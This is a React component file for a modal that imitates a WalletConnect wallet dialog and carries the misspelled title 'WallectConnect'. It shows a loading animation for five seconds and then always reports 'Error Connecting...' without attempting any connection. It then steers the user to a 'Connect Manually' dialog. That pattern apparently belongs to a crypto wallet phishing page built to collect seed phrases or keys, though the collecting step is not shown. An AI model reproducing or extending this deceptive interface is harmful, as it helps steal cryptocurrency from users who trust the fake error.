import { Close } from '@mui/icons-material';
import { Modal } from '@mui/material';
import React, { useEffect, useState } from 'react';
import loading from '../assets/loading.gif';

const WalletModal = ({ open, setOpen, setOpenConnect }) => {
	const [load, setLoad] = useState(false);

	useEffect(() => {
		setLoad(false);
		setTimeout(() => {
			setLoad(true);
		}, 5000);
	}, [open]);

	const handleClose = () => {
		setOpen(false);
	};

	return (
		<Modal open={open} onClose={handleClose}>
			<div className='container'>
				<div className='modal-top'>
					<h2>WallectConnect</h2>
					<Close onClick={handleClose} className='closeIcon' />
				</div>
				<div className='modal-body'>
					<div className='load-container'>
						{load ? (
							<>
								{' '}
								<span>Error Connecting...</span>
								<div
									className='manual-btn'
									onClick={() => {
										handleClose();
										setOpenConnect(true);
									}}>
									Connect <br /> Manually
								</div>{' '}
							</>
						) : (
							<img src={loading} alt='' />
						)}
					</div>
					<div className='modal-body-info'>
						<h3>Walletconnect</h3>
						<p>Easy-to-use browser extension.</p>
					</div>
				</div>
			</div>
		</Modal>
	);
};

export default WalletModal;
